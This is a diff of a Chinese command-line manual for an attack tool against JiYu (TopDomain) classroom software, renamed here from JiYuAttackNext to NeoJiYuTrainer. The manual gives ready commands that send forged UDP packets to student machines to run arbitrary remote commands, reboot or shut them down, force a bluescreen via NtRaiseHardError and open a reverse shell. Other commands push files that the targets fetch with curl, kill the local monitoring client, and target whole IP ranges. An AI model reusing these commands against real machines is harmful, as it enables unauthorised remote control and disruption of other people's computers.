@@ -1,7 +1,7 @@
 <div align="center">
 <h1>CLI 模式使用说明</h1>
 <p>
-   <a href="https://github.com/JasonFang0109c/jiyu_attack_next/releases/tag/nightly"><img alt="Nightly Build" src="https://img.shields.io/badge/Nightly-Build-blue?style=for-the-badge&logo=githubactions&labelColor=212121"></a>
+   <a href="https://github.com/JasonFang0109c/NeoJiYuTrainer/releases/tag/nightly"><img alt="Nightly Build" src="https://img.shields.io/badge/Nightly-Build-blue?style=for-the-badge&logo=githubactions&labelColor=212121"></a>
    <img alt="Single EXE" src="https://img.shields.io/badge/运行-单文件%20EXE-2CA5E0?style=for-the-badge&labelColor=212121">
    <img alt="No Python" src="https://img.shields.io/badge/依赖-无需%20Python-3ddc84?style=for-the-badge&labelColor=212121">
 </p>
@@ -10,7 +10,7 @@
 
 ---
 
-GUI 与 CLI 已合并到同一个单文件 EXE：从 [Nightly Build](https://github.com/JasonFang0109c/jiyu_attack_next/releases/tag/nightly) 或 [最新正式版](https://github.com/JasonFang0109c/jiyu_attack_next/releases/latest) 下载 **JiYuAttackNext.exe** 即可。无参数启动打开图形界面；带参数启动运行命令行模式，无需安装 Python 或 PySide6。正式版偏稳定，nightly 随 `main` 更新，两者版本号格式见[版本规范](../dev/VERSIONING.md)。
+GUI 与 CLI 已合并到同一个单文件 EXE：从 [Nightly Build](https://github.com/JasonFang0109c/NeoJiYuTrainer/releases/tag/nightly) 或 [最新正式版](https://github.com/JasonFang0109c/NeoJiYuTrainer/releases/latest) 下载 **NeoJiYuTrainer.exe** 即可。无参数启动打开图形界面；带参数启动运行命令行模式，无需安装 Python 或 PySide6。正式版偏稳定，nightly 随 `main` 更新，两者版本号格式见[版本规范](../dev/VERSIONING.md)。
 
 > **提示**
 > 单文件即可运行，不需要克隆仓库，也不需要安装 Python。双击 EXE 打开 GUI，在终端带参数运行进入 CLI；相对文件路径按终端当前工作目录解析。
@@ -55,6 +55,7 @@ GUI 与 CLI 已合并到同一个单文件 EXE：从 [Nightly Build](https://git
 
 | 来源 | 对应功能 |
 | --- | --- |
+| `JiYuTrainer` | 课堂助手、课堂防护与广播窗口右键菜单所依据的窗口处理规则、反监视/防控制 Hook 思路、远程命令确认流程和内核强杀思路；命令行不直接提供这些窗口操作 |
 | `Jiyu_udp_attack` | 文本消息（`remote message`）、远程命令（`remote command`）、重启与关机（`remote device`）、本机信息（`local info`）、防火墙规则（`local firewall`）的报文结构 |
 | 本程序新增 | 注销（`remote device --logoff`）、蓝屏（`remote device --bluescreen`）、文件传送（`remote file`）、反弹终端（`remote shell`）、启停学生端（`restriction student`） |
 
@@ -69,7 +70,7 @@ GUI 与 CLI 已合并到同一个单文件 EXE：从 [Nightly Build](https://git
   <tr>
     <td width="33%" valign="top">
       <h3>📥 获取程序</h3>
-      <p>下载 <code>JiYuAttackNext.exe</code>，保存到任意目录。</p>
+      <p>下载 <code>NeoJiYuTrainer.exe</code>，保存到任意目录。</p>
     </td>
     <td width="33%" valign="top">
       <h3>▶️ 运行命令</h3>
@@ -87,11 +88,11 @@ GUI 与 CLI 已合并到同一个单文件 EXE：从 [Nightly Build](https://git
 
 Windows 10/11。EXE 已包含 Python 运行时，命令行模式无需安装 Python 或 PySide6；只有从源码运行 CLI 时才需要 Python 3.13，在项目根目录执行 `python -m app ...` 即可。
 
-以下示例默认在保存 `JiYuAttackNext.exe` 的目录中执行 PowerShell。PowerShell 需要 `.\` 前缀；命令提示符（cmd）可直接写 `JiYuAttackNext.exe`。
+以下示例默认在保存 `NeoJiYuTrainer.exe` 的目录中执行 PowerShell。PowerShell 需要 `.\` 前缀；命令提示符（cmd）可直接写 `NeoJiYuTrainer.exe`。
 
 ```powershell
-.\JiYuAttackNext.exe -h
-.\JiYuAttackNext.exe --version
+.\NeoJiYuTrainer.exe -h
+.\NeoJiYuTrainer.exe --version
 ```
 
 `--version` 输出程序版本号，用于确认下载到的版本；版本号规则见[版本规范](../dev/VERSIONING.md)。正式版形如 `0.1.0`，测试版形如 `0.1.0-1a8ede3`：末尾 7 位是这次构建的提交哈希，方便对照是哪次改动。
@@ -99,7 +100,7 @@ Windows 10/11。EXE 已包含 Python 运行时，命令行模式无需安装 Pyt
 通用格式：
 
 ```text
-JiYuAttackNext.exe <分组> <子命令> [-ip <目标地址>] [-p <目标端口>] <该页面的参数>
+NeoJiYuTrainer.exe <分组> <子命令> [-ip <目标地址>] [-p <目标端口>] <该页面的参数>
 ```
 
 先写分组与子命令，再跟这个页面的参数。`-ip` 只有需要目标的功能才要求，默认 UDP 端口为 `4705`；`local info`、`local firewall` 与 `restriction student` 不需要目标地址。无参数启动会打开 GUI，带 `-h`、`--version` 或其他参数时运行 CLI；GUI 的启动与操作见 [GUI 模式使用说明](GUI.md)。
@@ -107,13 +108,13 @@ JiYuAttackNext.exe <分组> <子命令> [-ip <目标地址>] [-p <目标端口>]
 在命令提示符（cmd）中可直接运行：
 
 ```bat
-JiYuAttackNext.exe remote message -ip 10.49.151.29 -msg "Hello"
+NeoJiYuTrainer.exe remote message -ip 10.49.151.29 -msg "Hello"
 ```
 
 EXE 是窗口化程序，双击无参数启动只打开 GUI，不会创建控制台窗口。从终端带参数启动时，程序把输出写回当前终端，不会另开控制台窗口；由于它不占用控制台，提示符会立即返回，需要等命令执行完再继续时用 `start /wait`：
 
 ```bat
-start /wait JiYuAttackNext.exe remote message -ip 10.49.151.29 -msg "Hello"
+start /wait NeoJiYuTrainer.exe remote message -ip 10.49.151.29 -msg "Hello"
 ```
 
 重定向输出（`> 结果.txt`）与管道仍然有效。
@@ -124,10 +125,10 @@ start /wait JiYuAttackNext.exe remote message -ip 10.49.151.29 -msg "Hello"
 
 ```powershell
 # 先看有哪些分组
-.\JiYuAttackNext.exe -h
+.\NeoJiYuTrainer.exe -h
 
 # 再看某个页面能用哪些参数
-.\JiYuAttackNext.exe remote message -h
+.\NeoJiYuTrainer.exe remote message -h
 ```
 
 | 子命令 | 例子 |
@@ -238,7 +239,7 @@ debug 版本会在发送前写一条 `DEBUG` 日志“蓝屏载荷”，给出�
 
 | 参数 | 类型 | 默认值 | 用途与说明 |
 | --- | --- | --- | --- |
-| `--keep-data` | 开关 | 关 | 保留 `JiYuAttackNextData`；不写该选项时连同备注、设置与日志一起删除 |
+| `--keep-data` | 开关 | 关 | 保留 `data`；不写该选项时连同备注、设置与日志一起删除 |
 
 只允许在打包后的 EXE 中执行：源码运行时没有可清理的安装目录，会直接返回提示。卸载会删除桌面与开始菜单快捷方式，尝试停止并删除 `JiyuGuardDriver` 服务，然后安排退出后清理 EXE 所在目录；建议先关闭正在运行的程序。
 
@@ -265,7 +266,7 @@ debug 版本会在发送前写一条 `DEBUG` 日志“蓝屏载荷”，给出�
 ### 发送文本消息
 
 ```powershell
-.\JiYuAttackNext.exe remote message -ip 10.49.151.29 -msg "Hello"
+.\NeoJiYuTrainer.exe remote message -ip 10.49.151.29 -msg "Hello"
 ```
 
 ### 发送多行文本
@@ -279,7 +280,7 @@ $message = @'
 
 第四行通知
 '@
-.\JiYuAttackNext.exe remote message -ip 10.49.151.29 -msg $message
+.\NeoJiYuTrainer.exe remote message -ip 10.49.151.29 -msg $message
 ```
 
 CLI 模式保留传入字符串中的真实换行，不会把字面量 `\n` 转成换行；目标端是否按多行显示取决于学生端消息窗口的实现。
@@ -289,7 +290,7 @@ CLI 模式保留传入字符串中的真实换行，不会把字面量 `\n` 转�
 文本保存为 UTF-8 文件，可包含多行内容、空行及中文，也支持带 BOM 的 UTF-8。
 
 ```powershell
-.\JiYuAttackNext.exe remote message -ip 10.49.151.29 --msg-file "notice.txt"
+.\NeoJiYuTrainer.exe remote message -ip 10.49.151.29 --msg-file "notice.txt"
 ```
 
 `--msg-file -` 从标准输入读取文本，适合较长内容并避免将全文放入命令行参数；`--msg-file` 与 `-msg` 不可同时使用。
@@ -307,13 +308,13 @@ CLI 模式保留传入字符串中的真实换行，不会把字面量 `\n` 转�
 ### 指定目标端口
 
 ```powershell
-.\JiYuAttackNext.exe remote message -ip 10.49.151.29 -p 4705 -msg "Test message"
+.\NeoJiYuTrainer.exe remote message -ip 10.49.151.29 -p 4705 -msg "Test message"
 ```
 
 ### 发送查询命令
 
 ```powershell
-.\JiYuAttackNext.exe remote command -ip 10.49.151.29 -c "cmd.exe /c ipconfig"
+.\NeoJiYuTrainer.exe remote command -ip 10.49.151.29 -c "cmd.exe /c ipconfig"
 ```
 
 ### 使用包含空格的路径
@@ -321,7 +322,7 @@ CLI 模式保留传入字符串中的真实换行，不会把字面量 `\n` 转�
 在 PowerShell 中，用外层单引号包裹整个命令，并用内层双引号包裹路径：
 
 ```powershell
-.\JiYuAttackNext.exe remote command -ip 10.49.151.29 -c 'cmd.exe /c dir "C:\Program Files"'
+.\NeoJiYuTrainer.exe remote command -ip 10.49.151.29 -c 'cmd.exe /c dir "C:\Program Files"'
 ```
 
 ### 传送文件到桌面
@@ -329,7 +330,7 @@ CLI 模式保留传入字符串中的真实换行，不会把字面量 `\n` 转�
 以下命令选择本机文件，并通过目标学生端的远程命令能力触发系统自带的 `curl` 下载：
 
 ```powershell
-.\JiYuAttackNext.exe remote file -ip 10.49.151.1-10 --file "D:\资料\实验报告.pdf" --file-timeout 180
+.\NeoJiYuTrainer.exe remote file -ip 10.49.151.1-10 --file "D:\资料\实验报告.pdf" --file-timeout 180
 ```
 
 CLI 模式按目标逐个启动本机 HTTP 文件服务，向目标发送随机令牌的下载命令，目标使用当前登录用户桌面保存同名文件。下载完成后写入正式文件，中断则清理 `.part` 临时文件。UDP 命令未得到目标响应时最多重发 3 次，避免单次丢包造成任务无响应。
@@ -337,7 +338,7 @@ CLI 模式按目标逐个启动本机 HTTP 文件服务，向目标发送随机�
 `--file` 可以一次给多个路径，文件与文件夹可以混用：
 
 ```powershell
-.\JiYuAttackNext.exe remote file -ip 10.49.151.29 --file "D:\资料\实验报告.pdf" "D:\课件" "readme.txt"
+.\NeoJiYuTrainer.exe remote file -ip 10.49.151.29 --file "D:\资料\实验报告.pdf" "D:\课件" "readme.txt"
 ```
 
 文件夹按原结构递归展开：上例中的 `D:\课件` 会把其下所有层级的文件按相对路径一起传送，目标桌面出现同名文件夹。重复给出的路径只保留一次；一个文件夹里没有文件，或路径不存在时直接报错，不会静默跳过。
@@ -352,7 +353,7 @@ CLI 模式按目标逐个启动本机 HTTP 文件服务，向目标发送随机�
 ### 查询本机信息
 
 ```powershell
-.\JiYuAttackNext.exe local info
+.\NeoJiYuTrainer.exe local info
 ```
 
 仅查询运行 CLI 模式的本机，不查询远程目标；未匹配到学生端进程或端口时输出可能不完整。
@@ -363,25 +364,25 @@ CLI 模式按目标逐个启动本机 HTTP 文件服务，向目标发送随机�
 
 ```powershell
 # 只列进程与占用端口，不动进程
-.\JiYuAttackNext.exe restriction student --list
+.\NeoJiYuTrainer.exe restriction student --list
 
 # 只查程序位置：按记住的路径、运行中的进程、卸载信息与常见目录查找
-.\JiYuAttackNext.exe restriction student --path
+.\NeoJiYuTrainer.exe restriction student --path
 
 # 按当前状态切换：存在进程时结束，否则启动，与界面的单按钮一致
-.\JiYuAttackNext.exe restriction student
+.\NeoJiYuTrainer.exe restriction student
 
 # 只结束指定进程
-.\JiYuAttackNext.exe restriction student --pid 17600
+.\NeoJiYuTrainer.exe restriction student --pid 17600
 
 # 结束后不等 2 秒复查，直接返回
-.\JiYuAttackNext.exe restriction student --no-guardian
+.\NeoJiYuTrainer.exe restriction student --no-guardian
 
 # 启动学生端，留空路径时自动查找安装位置
-.\JiYuAttackNext.exe restriction student --start
+.\NeoJiYuTrainer.exe restriction student --start
 
 # 指定程序路径启动
-.\JiYuAttackNext.exe restriction student --start --exe "C:\Program Files\TopDomain\e-Learning Class Standard\1.00\StudentMain.exe"
+.\NeoJiYuTrainer.exe restriction student --start --exe "C:\Program Files\TopDomain\e-Learning Class Standard\1.00\StudentMain.exe"
 ```
 
 结束时先给有窗口的同名进程发关闭消息请它自己退出，等不到进程消失再强制结束，仍被拒绝才走管理员授权；极域学生端不响应正常退出，所以判定以进程是否真的消失为准。结束前会校验进程创建时间，进程号恰好被别的程序复用时不会误杀。默认结束后停留 2 秒复查，学生端又被拉起来时提示是守护服务重启了它，`--no-guardian` 可以跳过这段等待。
@@ -397,7 +398,7 @@ CLI 模式按目标逐个启动本机 HTTP 文件服务，向目标发送随机�
 没有第二台测试设备时，可以把 `-ip` 指向运行程序的本机 IPv4 地址，例如 `-ip 192.168.1.20`。CLI 会照常发送 UDP 报文；本机没有学生端监听对应端口时不会产生可见效果。
 
 ```powershell
-.\JiYuAttackNext.exe remote message -ip 192.168.1.20 -msg "本机测试"
+.\NeoJiYuTrainer.exe remote message -ip 192.168.1.20 -msg "本机测试"
 ```
 
 仓库提供的 `scripts/test_local_ip.py` 会自动选择本机地址，在空闲 UDP 端口上接收并校验消息、命令、重启、关机、注销和连续发送报文，适合验证协议与发送流程；运行方式见[开发与提交规范](../dev/CONTRIBUTING.md#本机-ip-自测)。
@@ -407,7 +408,7 @@ CLI 模式按目标逐个启动本机 HTTP 文件服务，向目标发送随机�
 以下命令发送 3 轮消息，相邻两轮之间等待 10 秒，最后一轮结束后不再等待：
 
 ```powershell
-.\JiYuAttackNext.exe remote message -ip 10.49.151.29 -msg "Test message" -l 3 -t 10
+.\NeoJiYuTrainer.exe remote message -ip 10.49.151.29 -msg "Test message" -l 3 -t 10
 ```
 
 ### 组合发送消息与命令
@@ -415,8 +416,8 @@ CLI 模式按目标逐个启动本机 HTTP 文件服务，向目标发送随机�
 子命令一次只做一件事，所以要同时发消息和命令，就写两条命令：
 
 ```powershell
-.\JiYuAttackNext.exe remote message -ip 10.49.151.29 -msg "Test"
-.\JiYuAttackNext.exe remote command -ip 10.49.151.29 -c "cmd.exe /c ipconfig"
+.\NeoJiYuTrainer.exe remote message -ip 10.49.151.29 -msg "Test"
+.\NeoJiYuTrainer.exe remote command -ip 10.49.151.29 -c "cmd.exe /c ipconfig"
 ```
 
 分组命令一次只做一项操作。需要顺序执行时，应等待前一个命令结束再运行下一个。
@@ -425,26 +426,26 @@ CLI 模式按目标逐个启动本机 HTTP 文件服务，向目标发送随机�
 
 ```powershell
 # 重启目标
-.\JiYuAttackNext.exe remote device -ip 10.49.151.29 --reboot
+.\NeoJiYuTrainer.exe remote device -ip 10.49.151.29 --reboot
 
 # 关闭目标
-.\JiYuAttackNext.exe remote device -ip 10.49.151.29 --shutdown
+.\NeoJiYuTrainer.exe remote device -ip 10.49.151.29 --shutdown
 
 # 注销目标当前登录用户
-.\JiYuAttackNext.exe remote device -ip 10.49.151.29 --logoff
+.\NeoJiYuTrainer.exe remote device -ip 10.49.151.29 --logoff
 
 # 触发目标蓝屏（启用关机特权后调用 NtRaiseHardError，机器随后重启）
-.\JiYuAttackNext.exe remote device -ip 10.49.151.29 --bluescreen
+.\NeoJiYuTrainer.exe remote device -ip 10.49.151.29 --bluescreen
 ```
 
 ### 反弹终端
 
 ```powershell
 # 在本机随机空闲端口监听，并把回连命令发到目标
-.\JiYuAttackNext.exe remote shell -ip 10.49.151.29
+.\NeoJiYuTrainer.exe remote shell -ip 10.49.151.29
 
 # 目标学生端端口不是默认的 4705 时，用 -p 指定
-.\JiYuAttackNext.exe remote shell -ip 10.49.151.29 -p 4800
+.\NeoJiYuTrainer.exe remote shell -ip 10.49.151.29 -p 4800
 ```
 
 启动后终端会打印终端监听端口与脚本服务端口，连上目标后逐行输入命令，`exit` 或 `quit` 结束并断开。本机回连地址按目标地址自动挑选出口网卡，监听端口由系统分配。目标没有连回来时输入的指令只会提示未发送，不会静默丢弃。
@@ -461,9 +462,9 @@ CLI 模式按目标逐个启动本机 HTTP 文件服务，向目标发送随机�
 
 ## 运行日志
 
-CLI 模式也会写运行日志，文件是数据目录下的 `cli.log`，与 GUI 的 `runtime.log` 分开，两个模式可以同时运行、各写各的文件。数据目录与 GUI 相同：EXE 所在目录下的 `JiYuAttackNextData`，源码运行时位于项目根目录。
+CLI 模式也会写运行日志，文件是数据目录下的 `cli.log`，与 GUI 的 `runtime.log` 分开，两个模式可以同时运行、各写各的文件。数据目录与 GUI 相同：EXE 所在目录下的 `data`，源码运行时位于项目根目录。
 
-- 没有等级开关，按构建变体的默认等级写入：正常版本写 `WARNING` 与 `ERROR`（图形界面里调低到 `INFO` 只影响界面自身的日志，命令行始终按默认等级落盘），`JiYuAttackNext_Debug.exe` 从 `DEBUG` 起记录。正常版本保留参数错误、发送失败与异常；调试版本记录分组、子命令、目标与报文数量等排查信息。启动参数摘要不包含消息或命令正文，但其他调试日志可能包含命令内容或文件路径，请谨慎保存和分享。
+- 没有等级开关，按构建变体的默认等级写入：正常版本写 `WARNING` 与 `ERROR`（图形界面里调低到 `INFO` 只影响界面自身的日志，命令行始终按默认等级落盘），`NeoJiYuTrainer_Debug.exe` 从 `DEBUG` 起记录。正常版本保留参数错误、发送失败与异常；调试版本记录分组、子命令、目标与报文数量等排查信息。启动参数摘要不包含消息或命令正文，但其他调试日志可能包含命令内容或文件路径，请谨慎保存和分享。
 - 只查帮助或版本号（`-h`、`--help`、`-V`、`--version`，包括子命令帮助）不会创建数据目录，也不写日志：这类调用没有副作用，不留下空目录与只有一行的日志文件。
 - 格式与 GUI 日志一致，可以直接用同一个查看器阅读：`2026-11-04 13:29:10.527 [10440] [MainThread] DEBUG   app.start.cli.log_arguments:31 - [命令行] 命令行参数`，多行内容以缩进续行写入。
 - 文件在本次运行期间保持打开，每条记录写入后刷新文件缓冲，命令结束时关闭句柄。
@@ -473,8 +474,8 @@ CLI 模式也会写运行日志，文件是数据目录下的 `cli.log`，与 GU
 
 | 现象 | 可能原因 | 检查建议 |
 | --- | --- | --- |
-| 提示找不到命令或程序 | 终端不在 EXE 所在目录，或 PowerShell 未加 `.\` 前缀 | 切换到 EXE 所在目录；PowerShell 使用 `.\JiYuAttackNext.exe ...`，cmd 可直接写 `JiYuAttackNext.exe ...`，也可使用绝对路径 |
-| 双击后只打开 GUI | 无参数启动按设计进入 GUI | 在终端带功能参数启动 CLI，例如 `.\JiYuAttackNext.exe remote message -ip 10.49.151.29 -msg "Hello"` |
+| 提示找不到命令或程序 | 终端不在 EXE 所在目录，或 PowerShell 未加 `.\` 前缀 | 切换到 EXE 所在目录；PowerShell 使用 `.\NeoJiYuTrainer.exe ...`，cmd 可直接写 `NeoJiYuTrainer.exe ...`，也可使用绝对路径 |
+| 双击后只打开 GUI | 无参数启动按设计进入 GUI | 在终端带功能参数启动 CLI，例如 `.\NeoJiYuTrainer.exe remote message -ip 10.49.151.29 -msg "Hello"` |
 | 提示“发送成功”，目标无响应 | 地址或端口不匹配、报文被拦截、学生端未监听、目标未执行指令 | 核对目标地址、UDP 端口、学生端状态及目标端执行结果 |
 | 包含空格的路径处理失败 | 路径未完整加引号，或引号在终端传参时发生变化 | 参考包含空格路径的示例，并核对目标端路径 |
 | `local info` 未显示端口 | 未找到 `Student` 相关进程或其 UDP 监听端口 | 在本机核对进程与监听状态；查询失败时会显示错误原因 |
